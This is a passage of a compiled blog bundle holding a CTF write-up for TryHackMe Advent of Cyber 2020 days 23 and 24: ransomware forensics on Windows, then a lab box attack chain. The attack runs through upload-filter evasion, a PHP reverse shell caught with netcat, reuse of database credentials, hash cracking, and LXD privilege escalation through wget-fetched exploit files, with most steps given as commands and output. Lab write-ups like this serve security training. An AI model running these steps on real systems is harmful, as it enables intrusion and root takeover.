Teaming"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Volume shadow copy service, Windows forensics")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"As the day draws near the Grinch is desperate. He used his secret weapon and launched a ransomware attack crippling the endpoints. Understand what is VSS and how it is used to recover files on the endpoint.")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.71.169")),(0,i.kt)("h3",{id:"connecting-via-rdp-1"},"Connecting via RDP"),(0,i.kt)("p",null,"Once again, I used Microsoft Remote Desktop to connect. This time the credentials are: ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator:sn0wF!akes!!!")),(0,i.kt)("h3",{id:"reading-the-ransomnote"},"Reading the ransomnote"),(0,i.kt)("p",null,"If we open the ransomnote, we find the following message."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"As you were calmly looking at your documents I encrypted all the workstations at Best Festival Company just now. Including yours McEager! Send me lots and lots of money to my bitcoin address (bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==) and MAYBE I'll give you the key to decrypt. >:^p\n")),(0,i.kt)("p",null,"The bitcoin address something in base64. We can try to decode it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'bluemoon@dragonfly:~/ctf/thm/thm-advent/day23-the-grinch-strikes-again$ echo "bm9tb3JlYmVzdGZlc3RpdmFsY29tcGFueQ==" | base64 -d\nnomorebestfestivalcompany\n')),(0,i.kt)("h3",{id:"looking-at-the-encrypted-files"},"Looking at the encrypted files"),(0,i.kt)("p",null,"First we assign a letter to all of the dirves so that we can view them in the Windows explorer.\n",(0,i.kt)("img",{alt:"screenshot",src:n(71944).Z,width:"1290",height:"604"})),(0,i.kt)("p",null,"I took a look at the Backup drive first."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(94698).Z,width:"1127",height:"292"})),(0,i.kt)("p",null,"The database folder contains an empty txt file."),(0,i.kt)("p",null,"The vStockings folder seems more interesting as it contains some encrypted files."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(3561).Z,width:"906",height:"130"}),"\n",(0,i.kt)("img",{alt:"screenshot",src:n(26100).Z,width:"906",height:"136"}),"\n",(0,i.kt)("img",{alt:"screenshot",src:n(91974).Z,width:"907",height:"148"})),(0,i.kt)("p",null,"It seems like the encrypted files have a ",(0,i.kt)("inlineCode",{parentName:"p"},".grinch")," extension."),(0,i.kt)("p",null,"Lastly, there is a confidential folder which is hidden. Inside, there is the ",(0,i.kt)("inlineCode",{parentName:"p"},"master-password.txt.grinch")," file. However, it is not encrypted so we can see that his password is ",(0,i.kt)("inlineCode",{parentName:"p"},"m33pa55w0rdIZseecure!"),"."),(0,i.kt)("h3",{id:"looking-through-the-scheduled-tasks"},"Looking through the scheduled tasks"),(0,i.kt)("p",null,"We can also take a look through the scheduled tasks. Looking through them, the ",(0,i.kt)("inlineCode",{parentName:"p"},"opidsfsdf")," task looks quite suspicious. It seems to be running whenever the Administrator user logs in.\n",(0,i.kt)("img",{alt:"screenshot",src:n(13654).Z,width:"1154",height:"278"})),(0,i.kt)("p",null,"Let's collect more information!"),(0,i.kt)("p",null,"It seems like it starts to run an executable file at ",(0,i.kt)("inlineCode",{parentName:"p"},"C:\\Users\\Administrator\\Desktop\\opidsfsdf.exe")),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(33570).Z,width:"1181",height:"437"})),(0,i.kt)("h3",{id:"looking-for-a-vss-scheduled-task"},"Looking for a VSS scheduled task"),(0,i.kt)("p",null,"Looking through the scheduled tasks, we also find ",(0,i.kt)("inlineCode",{parentName:"p"},"ShadowCopyVolume{7a9eea15-0000-0000-0000-010000000000}")," which seems to be the part of the Volume Shadow Copu Service."),(0,i.kt)("h2",{id:"day-24-the-trial-before-christmas"},"Day 24: The Trial Before Christmas"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Special"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: Web, Linux"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Special Contributer: DarkStar7471")),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Ready for one last challenge to make sure you've earned your presents this year? Use the skills gained throughout Advent of Cyber to prove your mettle and conquer day twenty four!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.126.85")),(0,i.kt)("h3",{id:"basic-enumeration-8"},"Basic Enumeration"),(0,i.kt)("p",null,"As always, we start off with an Nmap scan."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"# Nmap 7.80 scan initiated Thu Dec 24 15:23:48 2020 as: nmap -sC -sV -vvv -oN nmap.log 10.10.126.85\nNmap scan report for 10.10.126.85\nHost is up, received syn-ack (0.16s latency).\nScanned at 2020-12-24 15:23:48 EST for 37s\nNot shown: 998 closed ports\nReason: 998 conn-refused\nPORT      STATE SERVICE REASON  VERSION\n80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))\n| http-methods: \n|_  Supported Methods: POST OPTIONS HEAD GET\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n65000/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Light Cycle\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Dec 24 15:24:25 2020 -- 1 IP address (1 host up) scanned in 36.97 seconds\n")),(0,i.kt)("h3",{id:"what-is-the-title-of-the-webpages"},"What is the title of the webpages"),(0,i.kt)("p",null,"A copy of the ",(0,i.kt)("inlineCode",{parentName:"p"},"TryHackMe")," website is running on port 80 and ",(0,i.kt)("inlineCode",{parentName:"p"},"Light Cycle")," is running on port 65000."),(0,i.kt)("h3",{id:"gobuster"},"Gobuster"),(0,i.kt)("p",null,"I then ran gobuster on both ports."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u 10.10.126.85 -w ~/ctf/common.txt -x php\n\n=====================================================\nGobuster v2.0.1              OJ Reeves (@TheColonial)\n=====================================================\n[+] Mode         : dir\n[+] Url/Domain   : http://10.10.126.85/\n[+] Threads      : 10\n[+] Wordlist     : /home/bluemoon/ctf/common.txt\n[+] Status codes : 200,204,301,302,307,403\n[+] Extensions   : php\n[+] Timeout      : 10s\n=====================================================\n2020/12/24 16:05:52 Starting gobuster\n=====================================================\n/.hta (Status: 403)\n/.hta.php (Status: 403)\n/.htaccess (Status: 403)\n/.htaccess.php (Status: 403)\n/.htpasswd (Status: 403)\n/.htpasswd.php (Status: 403)\n/3 (Status: 301)\n/codes (Status: 301)\n/index.html (Status: 200)\n/server-status (Status: 403)\n=====================================================\n2020/12/24 16:07:35 Finished\n=====================================================\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ gobuster -u http://10.10.126.85:65000 -w ~/ctf/common.txt -x php\n\n=====================================================\nGobuster v2.0.1              OJ Reeves (@TheColonial)\n=====================================================\n[+] Mode         : dir\n[+] Url/Domain   : http://10.10.126.85:65000/\n[+] Threads      : 10\n[+] Wordlist     : /home/bluemoon/ctf/common.txt\n[+] Status codes : 200,204,301,302,307,403\n[+] Extensions   : php\n[+] Timeout      : 10s\n=====================================================\n2020/12/24 16:06:14 Starting gobuster\n=====================================================\n/.hta (Status: 403)\n/.hta.php (Status: 403)\n/.htaccess (Status: 403)\n/.htaccess.php (Status: 403)\n/.htpasswd (Status: 403)\n/.htpasswd.php (Status: 403)\n/api (Status: 301)\n/assets (Status: 301)\n/grid (Status: 301)\n/index.php (Status: 200)\n/index.php (Status: 200)\n/server-status (Status: 403)\n/uploads.php (Status: 200)\n=====================================================\n2020/12/24 16:07:53 Finished\n=====================================================\n")),(0,i.kt)("p",null,"Looking at the ",(0,i.kt)("inlineCode",{parentName:"p"},"Light Cycle")," website, ",(0,i.kt)("inlineCode",{parentName:"p"},"uploads.php")," looks like where we can upload files and ",(0,i.kt)("inlineCode",{parentName:"p"},"/grid")," looks ike a place where we can access the files we have uploaded."),(0,i.kt)("h3",{id:"evading-the-upload-filter"},"Evading the upload filter"),(0,i.kt)("p",null,"At ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.126.85:65000/uploads.php"),", we see an upload form."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(59507).Z,width:"1528",height:"708"})),(0,i.kt)("p",null,"However, this is protected by both a server and client side filter. We can use BurpSuite to intercept the web traffic and then drop the request for ",(0,i.kt)("inlineCode",{parentName:"p"},"filter.js"),". Next, we can mess with the file extension of a php reverse shell to get through the server side filter. We can rename ",(0,i.kt)("inlineCode",{parentName:"p"},"php-reverse-shell.php")," as ",(0,i.kt)("inlineCode",{parentName:"p"},"php-reverse-shell.jpg.php"),". We also see that any file we upload ends up in the ",(0,i.kt)("inlineCode",{parentName:"p"},"/grid/")," directory."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(64127).Z,width:"546",height:"256"})),(0,i.kt)("p",null,"Next, we set up a netcat listener and wait for the connection to come through once we click on it!"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ nc -lvnp 4444\nListening on 0.0.0.0 4444\nConnection received on 10.10.126.85 60820\nLinux light-cycle 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 21:31:02 up 32 min,  0 users,  load average: 0.00, 0.00, 0.12\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$\n")),(0,i.kt)("p",null,"JACKPOT!"),(0,i.kt)("h3",{id:"getting-web-flag-webtxt"},"Getting web flag: ",(0,i.kt)("inlineCode",{parentName:"h3"},"web.txt")),(0,i.kt)("p",null,"Since we are currently ",(0,i.kt)("inlineCode",{parentName:"p"},"www-data"),", we will probably find the ",(0,i.kt)("inlineCode",{parentName:"p"},"web.txt")," file in our home directory: ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/www"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ cat /var/www/web.txt\nTHM{ENTER_THE_GRID}\n")),(0,i.kt)("p",null,"Web Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{ENTER_THE_GRID}")),(0,i.kt)("h3",{id:"spawning-a-stable-shell-using-python"},"Spawning a stable shell using Python"),(0,i.kt)("p",null,"We can use python to spawn a stable shell"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"$ python3 -c \"import pty; pty.spawn('/bin/bash')\"\nwww-data@light-cycle:/var/www$ \n")),(0,i.kt)("h3",{id:"poking-through-the-filesystem"},"Poking through the filesystem"),(0,i.kt)("p",null,"Although ",(0,i.kt)("inlineCode",{parentName:"p"},"www-data")," is very unpriviledged, we can still look through the ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/www")," folder. One particularly interesting file is ",(0,i.kt)("inlineCode",{parentName:"p"},"/var/www/TheGrid/includes/dbauth.php")," which contains the credentials to a MySQL database: ",(0,i.kt)("inlineCode",{parentName:"p"},"tron:IFightForTheUsers"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n        $dbaddr = "localhost";\n        $dbuser = "tron";\n        $dbpass = "IFightForTheUsers";\n        $database = "tron";\n\n        $dbh = new mysqli($dbaddr, $dbuser, $dbpass, $database);\n        if($dbh->connect_error){\n                die($dbh->connect_error);\n        }\n?>\n')),(0,i.kt)("h3",{id:"accessing-the-database"},"Accessing the database"),(0,i.kt)("p",null,"Now we can poke through the MySQL database. Run ",(0,i.kt)("inlineCode",{parentName:"p"},"mysql -u tron -p")," in the terminal to get access to the MySQL command line interface."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p\nmysql -u tron -p\nEnter password: IFightForTheUsers\n\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 6\nServer version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu)\n\nCopyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql>\n")),(0,i.kt)("p",null,"It looks like there are only 1 interesting database."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"mysql> show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| tron               |\n+--------------------+\n2 rows in set (0.01 sec)\n")),(0,i.kt)("p",null,"Let's take a look inside."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"mysql> use tron;\nuse tron;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql> show tables;\nshow tables;\n+----------------+\n| Tables_in_tron |\n+----------------+\n| users          |\n+----------------+\n1 row in set (0.00 sec)\n\nmysql> SELECT * FROM users;\nSELECT * FROM users;\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n|  1 | flynn    | edc621628f6d19a13a00fd683f5e3ff7 |\n+----+----------+----------------------------------+\n1 row in set (0.00 sec)\n")),(0,i.kt)("h3",{id:"cracking-the-password-hash"},"Cracking the password hash"),(0,i.kt)("p",null,"It seems like this developer did one thing right. He hashed the password. However, the user used a very common password so we can easily crack it using ",(0,i.kt)("inlineCode",{parentName:"p"},"https://crackstation.net/")," or a similar site. It seems like his flynn's password is ",(0,i.kt)("inlineCode",{parentName:"p"},"@computer@"),"."),(0,i.kt)("h3",{id:"becoming-flynn"},"Becoming Flynn"),(0,i.kt)("p",null,"Now that we know have some more credentials, we can log in using ",(0,i.kt)("inlineCode",{parentName:"p"},"flynn:@computer@")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"www-data@light-cycle:/$ su flynn\nsu flynn\nPassword: @computer@\n\nflynn@light-cycle:/$\n")),(0,i.kt)("h3",{id:"getting-user-flag-usertxt"},"Getting user flag: ",(0,i.kt)("inlineCode",{parentName:"h3"},"user.txt")),(0,i.kt)("p",null,"The user flag is stored in the user's home directory. We now have the permissions to read it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"flynn@light-cycle:~$ cat /home/flynn/user.txt\ncat /home/flynn/user.txt\nTHM{IDENTITY_DISC_RECOGNISED}\n")),(0,i.kt)("p",null,"User Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{IDENTITY_DISC_RECOGNISED}")),(0,i.kt)("h3",{id:"privilege-escalation-2"},"Privilege Escalation"),(0,i.kt)("p",null,"Let's run the ",(0,i.kt)("inlineCode",{parentName:"p"},"id")," command to see what groups flynn is in."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"flynn@light-cycle:~$ id\nid\nuid=1000(flynn) gid=1000(flynn) groups=1000(flynn),109(lxd)\n")),(0,i.kt)("p",null,"Ok, so looks like we will be doing a LXD Privilege Escalation. So let's ",(0,i.kt)("inlineCode",{parentName:"p"},"git clone")," the repository."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"git clone https://github.com/saghul/lxd-alpine-builder.git\n")),(0,i.kt)("p",null,"Now we can build alpine."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"cd lxd-alpine-builder/\nsudo ./build-alpine\n")),(0,i.kt)("p",null,"Now, there should be a gzip compressed data folder in the directory. We need to get this onto the victim box and so we can use ",(0,i.kt)("inlineCode",{parentName:"p"},"http-server"),"."),(0,i.kt)("p",null,"So on my attacker machine I run the following:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas/lxd-alpine-builder$ http-server\nStarting up http-server, serving ./\nAvailable on:\n  http://127.0.0.1:8081\n  http://172.16.57.163:8081\n  http://10.6.23.34:8081\nHit CTRL-C to stop the server\n")),(0,i.kt)("p",null,"Then on the victim machine, I can ",(0,i.kt)("inlineCode",{parentName:"p"},"wget")," it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"flynn@light-cycle:~$ wget http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz\n<23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz\n--2020-12-25 15:48:13--  http://10.6.23.34:8081/alpine-v3.12-x86_64-20201225_1041.tar.gz\nConnecting to 10.6.23.34:8081... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3203370 (3.1M) [application/gzip]\nSaving to: \u2018alpine-v3.12-x86_64-20201225_1041.tar.gz\u2019\n\nalpine-v3.12-x86_64 100%[===================>]   3.05M  1.10MB/s    in 2.8s    \n\n2020-12-25 15:48:16 (1.10 MB/s) - \u2018alpine-v3.12-x86_64-20201225_1041.tar.gz\u2019 saved [3203370/3203370]\n")),(0,i.kt)("p",null,"Next, we can download the shell script from ",(0,i.kt)("inlineCode",{parentName:"p"},"https://www.exploit-db.com/exploits/46978")," and also send that file over to the victim using ",(0,i.kt)("inlineCode",{parentName:"p"},"http-server"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"bluemoon@dragonfly:~/ctf/thm/thm-advent/day24-the-trial-before-christmas$ http-server\nStarting up http-server, serving ./\nAvailable on:\n  http://127.0.0.1:8081\n  http://172.16.57.163:8081\n  http://10.6.23.34:8081\nHit CTRL-C to stop the server\n")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"flynn@light-cycle:~$ wget http://10.6.23.34:8081/46978.sh\nwget http://10.6.23.34:8081/46978.sh\n--2020-12-25 15:57:35--  http://10.6.23.34:8081/46978.sh\nConnecting to 10.6.23.34:8081... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1500 (1.5K) [application/x-sh]\nSaving to: \u201846978.sh\u2019\n\n46978.sh            100%[===================>]   1.46K  --.-KB/s    in 0s      \n\n2020-12-25 15:57:35 (192 MB/s) - \u201846978.sh\u2019 saved [1500/1500]\n")),(0,i.kt)("p",null,"Now, we can see both files are on the victim machine"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"-rw-rw-r-- 1 flynn flynn    1500 Dec 25 15:54 46978.sh\n-rw-rw-r-- 1 flynn flynn 3203370 Dec 25 15:41 alpine-v3.12-x86_64-20201225_1041.tar.gz\n")),(0,i.kt)("p",null,"Next, we can mark ",(0,i.kt)("inlineCode",{parentName:"p"},"46978.sh")," as executable and run it."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"flynn@light-cycle:~$ chmod +x 46978.sh\nflynn@light-cycle:~$ ./46978.sh -f alpine-v3.12-x86_64-20201225_1041.tar.gz\n")),(0,i.kt)("p",null,"Once we are in the lxc container, we can move to the root directory of the host machine which is mounted at ",(0,i.kt)("inlineCode",{parentName:"p"},"/mnt/root"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"~ # cd /mnt/root\ncd /mnt/root\n/mnt/root # ls -l    \nls -l\ntotal 239788\ndrwxr-xr-x    2 root     root          4096 Dec 18 14:17 bin\ndrwxr-xr-x    3 root     root          4096 Dec 18 14:22 boot\ndrwxr-xr-x   17 root     root          3680 Dec 25 15:24 dev\ndrwxr-xr-x   94 root     root          4096 Dec 20 04:51 etc\ndrwxr-xr-x    3 root     root          4096 Dec 18 14:08 home\nlrwxrwxrwx    1 root     root            34 Dec 18 14:18 initrd.img -> boot/initrd.img-4.15.0-128-generic\nlrwxrwxrwx    1 root     root            33 Dec 18 14:04 initrd.img.old -> boot/initrd.img-4.15.0-20-generic\ndrwxr-xr-x   22 root     root          4096 Dec 18 14:06 lib\ndrwxr-xr-x    2 root     root          4096 Dec 18 14:15 lib64\ndrwx------    2 root     root         16384 Dec 18 14:04 lost+found\ndrwxr-xr-x    3 root     root          4096 Dec 18 14:04 media\ndrwxr-xr-x    2 root     root          4096 Apr 26  2018 mnt\ndrwxr-xr-x    2 root     root          4096 Apr 26  2018 opt\ndr-xr-xr-x  151 root     root             0 Dec 25 15:24 proc\ndrwx------    4 root     root          4096 Dec 20 03:51 root\ndrwxr-xr-x   26 root     root           860 Dec 25 16:05 run\ndrwxr-xr-x    2 root     root         12288 Dec 18 14:17 sbin\ndrwxr-xr-x    2 root     root          4096 Dec 18 14:09 snap\ndrwxr-xr-x    2 root     root          4096 Apr 26  2018 srv\n-rw-------    1 root     root     245452800 Dec 18 14:04 swapfile\ndr-xr-xr-x   13 root     root             0 Dec 25 15:24 sys\ndrwxrwxrwt   10 root     root          4096 Dec 25 16:05 tmp\ndrwxr-xr-x   10 root     root          4096 Dec 18 14:04 usr\ndrwxr-xr-x   14 root     root          4096 Dec 18 14:07 var\nlrwxrwxrwx    1 root     root            31 Dec 18 14:18 vmlinuz -> boot/vmlinuz-4.15.0-128-generic\nlrwxrwxrwx    1 root     root            30 Dec 18 14:04 vmlinuz.old -> boot/vmlinuz-4.15.0-20-generic\n")),(0,i.kt)("h3",{id:"getting-root-flag-roottxt"},"Getting root flag: ",(0,i.kt)("inlineCode",{parentName:"h3"},"root.txt")),(0,i.kt)("p",null,"Now, we can change into the root user's home directory and cat out the flag."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"/mnt/root # cd root  \n/mnt/root/root # ls -alF\ntotal 32\ndrwx------    4 root     root          4096 Dec 20 03:51 ./\ndrwxr-xr-x   23 root     root          4096 Dec 18 14:18 ../\nlrwxrwxrwx    1 root     root             9 Dec 18 17:43 .bash_history -> /dev/null\n-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc\ndrwxr-x---    3 root     root          4096 Dec 20 03:51 .config/\nlrwxrwxrwx    1 root     root             9 Dec 19 15:15 .mysql-history -> /dev/null\n-rw-------    1 root     root           264 Dec 19 15:19 .mysql_history\n-rw-r--r--    1 root     root           148 Aug 17  2015 .profile\ndrwx------    2 root     root          4096 Dec 18 17:57 .ssh/\n-r--------    1 root     root           600 Dec 19 20:18 root.txt\n/mnt/root/root # cat root.txt\nTHM{FLYNN_LIVES}\n\n\n\n\"As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word 'HOLO' embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!\"\n")),(0,i.kt)("p",null,"Root flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{FLYNN_LIVES}")))}c.isMDXComponent=!0},84561:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/files/solve-8139da40a9c92b73f6b969059e907088.sh"},59437:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/files/passwords-11a59e7a6092833476048bda1335029f.txt"},93362:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/files/usernames-d0caf4c1e75ec26a50eac989a67a2cdf.txt"},69543:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/ChirstmasControlCenterControlPanel-3b8aec30f0deec9e9e85ba4ef442f29e.png"},80222:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/ChristmasControlCenterLogin-3e49e16d80d487b5ac786a1717da9e76.png"},71856:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/initial_page-a23a8f39af1f8830e08e6ee3f3ed6674.png"},78652:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/initial_page_id-3dde9ba414a9a81304c95984425e65a9.png"},46492:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/network_tab-52e81bd9404c3cb7f51539aab5277a49.png"},56355:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/flag-999be82bc2813e746461f98fc76b7b5c.png"},73365:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/initial_page-b71767a8b9843869a720ba32488db468.png"},65962:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/network_tab-a286ff6b96dc6c35552a23af68f2a24a.png"},21562:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/nothing-457da9d83e0fba5b3c64586683a1148d.png"},82725:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/panel_login-c655156ffb1bfb50be28e679e149b1f6.png"},1209:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/panel_page-f6012942962540e56167349f8adf5fbd.png"},12782:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/fake_flag-d26994091feab002d963b632c0e33929.png"},77879:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/make_a_wish-52a321a786eca2925a742b0b5b2b035e.png"},89214:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/reflected_xss-ba8373813d935acc1ba67e0b79cef76d.png"},35185:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/stored_xss-23500120e4f54e61f5106a775d54257d.png"},94050:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/export_objects-a9ff931a5bae841a290105c3e4e59505.png"},70363:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/finding_password-65ba27c5ff2e0d81794b415c80279173.png"},84032:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/follow_ftp_tcp-d05977a9bf0f8c98472c836de0b0d876.png"},52915:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/http_object_list-ada0559d693b5e761f7b7f2e12a20fd7.png"},99006:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/pcap1_ping-daa2e072a35c5d146a787e1b4b409676.png"},99900:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/reindeer-of-the-week-c6caa76f8cd2e895a5c379d824c69e6e.png"},19971:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/ssh-c3c251142ee67ab1c0ef09286dee8e45.png"},55482:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/apache_tomcat-88c8df451d1b7b17e90747a030fb54a8.png"},30614:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/cve_details_overview-f8e6b4091e8481bfd089784c8d50cdd4.png"},57353:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/cve_details_vuln-c42bde458e4db1a59b7537fcebf1fbb6.png"},42188:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/apple_maps-811a6866bc791d13663385e050371fa9.png"},33121:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/google_maps-a7d072a97d921c6af661ecb924fbcdf5.png"},19549:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/lights-festival-website-9d37f29b88e5d49d2a7d7f849da13772.jpg"},60537:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/index-616729698572cbfddd90d2abbcf3fb40.png"},56041:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/ilspy-b2a6a3150743292c3cf6676f075380e3.png"},76792:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/rdp-139a51c2dab1b04d4844711966c62efb.png"},2383:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/success-e473422f7f733db249227eaf2635bfbb.png"},18470:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/index-f427a1541c297b81c79a68b0326fcb08.png"},3930:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/list-735cdd75e99457e8897fa06bc3bc5978.png"},9106:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/desktop-9b6ca970580e1e7974a734b38847e3d7.png"},25979:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/rdp_login-74ee0b31a81a477771a6160a8e87bf0b.png"},89649:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/locked_keypass-5e881e97a37c064be8c2cd86546188f6.png"},33570:(e,t,n)=>{n.d(t,{Z:()=>a});const 